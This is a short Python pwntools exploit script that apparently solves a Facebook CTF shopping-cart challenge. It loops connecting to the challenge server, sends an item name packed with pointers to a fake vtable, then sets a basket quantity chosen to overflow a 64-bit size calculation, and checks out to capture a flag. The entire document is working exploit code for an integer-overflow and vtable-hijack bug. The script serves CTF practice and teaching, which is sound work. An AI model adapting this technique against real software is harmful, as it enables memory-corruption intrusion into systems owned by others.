from pwn import *

for i in xrange(512):
    r = remote("challenges.fbctf.com", 1342)

    # Create item
    r.sendline('1')
    FUNC = 0x701e40
    #FUNC = 0x41414141 + 0x18
    vtable_ptr = FUNC-0x18
    r.sendline(p64(vtable_ptr) * 8)  # name - pointer to fake vtable
    r.sendline('bob')    # description
    r.sendline('1.23')   # price 

    # Add item to basket
    r.sendline('4')
    r.sendline('1')  # second item, added above
    r.sendline('288230376151711745') # quantity - (2**64 / 64) + 1

    # Check out
    r.sendline('6')
    retval = r.recvall()

    if 'fb' in retval:
        print(retval)
